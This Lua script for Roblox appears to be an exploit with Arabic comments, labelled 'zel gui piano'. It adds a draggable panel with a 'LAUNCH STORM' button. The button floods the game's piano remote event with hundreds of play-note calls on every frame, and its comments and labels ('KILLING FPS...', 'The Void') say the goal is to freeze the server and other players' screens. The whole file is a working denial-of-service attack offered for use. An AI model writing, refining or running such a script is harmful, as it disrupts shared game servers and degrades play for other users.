-- [[ zel gui piano - ULTIMATE CLEAN EDITION ]] --
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "ZelPianoClean"
ScreenGui.Parent = CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- [[ 1. زر الفتح والقفل (Z) ]] --
local ToggleBtn = Instance.new("TextButton", ScreenGui)
ToggleBtn.Size = UDim2.new(0, 45, 0, 45)
ToggleBtn.Position = UDim2.new(0, 20, 0.8, 0)
ToggleBtn.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
ToggleBtn.Text = "Z"
ToggleBtn.TextColor3 = Color3.fromRGB(0, 255, 150)
ToggleBtn.Font = Enum.Font.Code
ToggleBtn.TextSize = 22
Instance.new("UICorner", ToggleBtn).CornerRadius = UDim.new(1, 0)
local TStroke = Instance.new("UIStroke", ToggleBtn)
TStroke.Color = Color3.fromRGB(0, 255, 150)
TStroke.Thickness = 2

-- [[ 2. الواجهة الرئيسية ]] --
local Main = Instance.new("Frame", ScreenGui)
Main.Name = "Main"
Main.AnchorPoint = Vector2.new(0.5, 0.5)
Main.Position = UDim2.new(0.5, 0, 0.5, 0)
Main.Size = UDim2.new(0, 260, 0, 300)
Main.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
Main.BorderSizePixel = 0
Main.ClipsDescendants = true

Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 12)
local MStroke = Instance.new("UIStroke", Main)
MStroke.Color = Color3.fromRGB(40, 40, 40)

-- شريط العنوان (الاسم الجديد)
local Header = Instance.new("Frame", Main)
Header.Name = "Header"
Header.Size = UDim2.new(1, 0, 0, 40)
Header.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Instance.new("UICorner", Header)

local Title = Instance.new("TextLabel", Header)
Title.Text = "  zel gui piano" -- تم تعديل الاسم بناءً على طلبك
Title.Size = UDim2.new(1, 0, 1, 0)
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.Code
Title.TextSize = 14
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.BackgroundTransparency = 1

-- [[ 3. محرك السحب الحر (Draggable) ]] --
local function MakeDraggable(gui)
	local dragging, dragInput, dragStart, startPos
	gui.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then dragging = false end
			end)
		end
	end)
	UserInputService.InputChanged:Connect(function(input)
		if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
			local delta = input.Position - dragStart
			TweenService:Create(gui, TweenInfo.new(0.12, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
				Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
			}):Play()
		end
	end)
end
MakeDraggable(Main)

-- [[ 4. محرك الفتح والقفل (Elastic Animation) ]] --
local isOpen = true
ToggleBtn.MouseButton1Click:Connect(function()
	isOpen = not isOpen
	if isOpen then
		Main.Visible = true
		Main:TweenSize(UDim2.new(0, 260, 0, 300), "Out", "Elastic", 0.7, true)
	else
		Main:TweenSize(UDim2.new(0, 0, 0, 0), "In", "Back", 0.5, true, function()
			if not isOpen then Main.Visible = false end
		end)
	end
end)

-- [[ 5. أزرار التحكم ]] --
local Content = Instance.new("Frame", Main)
Content.Size = UDim2.new(1, -20, 1, -60)
Content.Position = UDim2.new(0, 10, 0, 50)
Content.BackgroundTransparency = 1
Instance.new("UIListLayout", Content).Padding = UDim.new(0, 10)

local PowerIn = Instance.new("TextBox", Content)
PowerIn.Size = UDim2.new(1, 0, 0, 45)
PowerIn.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
PowerIn.Text = "400"
PowerIn.PlaceholderText = "INTENSITY"
PowerIn.TextColor3 = Color3.fromRGB(0, 255, 150)
PowerIn.Font = Enum.Font.Code
Instance.new("UICorner", PowerIn)

local Start = Instance.new("TextButton", Content)
Start.Size = UDim2.new(1, 0, 0, 50)
Start.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
Start.Text = "LAUNCH STORM"
Start.Font = Enum.Font.Code
Start.TextColor3 = Color3.new(0, 0, 0)
Instance.new("UICorner", Start)

-- [[ 6. محرك الـ 1 FPS (The Void) ]] --
local running = false
local piano = workspace:FindFirstChild("GlobalPianoConnector")

Start.MouseButton1Click:Connect(function()
	if running then 
		running = false
		Start.Text = "LAUNCH STORM"
		Start.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
		return 
	end
	
	running = true
	Start.Text = "KILLING FPS..."
	Start.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
	
	local x = tonumber(PowerIn.Text) or 400
	
	task.spawn(function()
		while running do
			for _ = 1, 3 do -- 3 طبقات إرسال موازية لضمان التعليق
				task.spawn(function()
					for note = 1, 61 do
						if not running then break end
						coroutine.resume(coroutine.create(function()
							for i = 1, x do piano:FireServer("play", note) end
						end))
					end
				end)
			end
			RunService.Heartbeat:Wait()
		end
	end)
end)
